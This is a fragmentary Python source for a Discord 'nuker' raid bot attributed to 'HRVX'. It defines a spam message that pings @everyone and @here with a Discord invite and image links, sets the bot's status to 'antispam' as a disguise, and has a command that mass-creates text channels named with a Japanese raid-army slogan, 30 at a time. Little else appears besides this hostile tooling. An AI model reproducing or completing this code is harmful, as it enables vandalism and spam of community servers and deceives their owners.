...
宣伝文 = (
    "@everyone @here\n"
    "# Nuked by HRVX\n"
    "# [参加](https://discord.gg/gfHyKjwEXG)\n"
    "# [画像](https://imgur.com/OhvWdzw)\n"
    "# [画像](https://imgur.com/z1M0l0Q)\n"
...
@bot.event
async def on_ready():
    await bot.change_presence(status=Status.dnd, activity=Activity(type=ActivityType.playing, name="antispam"))
...
async def hrvx(ctx):
    ...
    for i in range(0, 60, 15):
        tasks = [
            asyncio.create_task(guild.create_text_channel("荒らし革命軍万歳"))
            for _ in range(30)
        ]
